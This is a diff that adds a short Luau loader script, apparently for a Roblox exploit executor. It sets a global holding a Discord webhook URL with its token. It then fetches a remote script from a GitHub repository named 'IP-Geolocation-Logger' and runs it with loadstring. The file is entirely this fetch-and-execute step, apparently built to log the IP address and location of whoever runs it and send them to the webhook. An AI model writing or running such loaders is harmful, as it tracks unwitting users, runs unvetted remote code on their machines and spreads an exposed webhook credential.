@@ -1,0 +1,11 @@
+getgenv()["https://discord.com/api/webhooks/1483203641203753011/-UHSiYlb1UhaDFC5Ucip9w8nJ13nPbeUSX_shvTgcVT6ZD4Q2hQAGpPiaLJ2vlhX72da"] = "https://discord.com/api/webhooks/1483203641203753011/-UHSiYlb1UhaDFC5Ucip9w8nJ13nPbeUSX_shvTgcVT6ZD4Q2hQAGpPiaLJ2vlhX72da"
+
+local success, response = pcall(function()
+	return game:HttpGet("https://raw.githubusercontent.com/mcantcode/IP-Geolocation-Logger/refs/heads/main/src/main.luau")
+end)
+
+if success then
+	loadstring(response)()
+else
+	return
+end
